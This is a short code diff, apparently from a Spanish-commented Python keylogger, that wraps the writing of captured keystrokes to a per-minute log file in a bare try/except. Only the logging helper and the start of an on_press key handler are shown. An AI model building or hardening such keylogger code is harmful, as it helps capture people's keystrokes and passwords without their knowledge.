@@ -28,8 +28,11 @@ def write_to_log(content):
         last_minute = minute
         current_log_path = get_log_filename()
 
-    with open(current_log_path, "a", encoding="utf-8") as f:
-        f.write(content)
+    try:
+        with open(current_log_path, "a", encoding="utf-8") as f:
+            f.write(content)
+    except:
+        print("An exception occurred")
 
 # Funciones del keylogger
 def on_press(key):
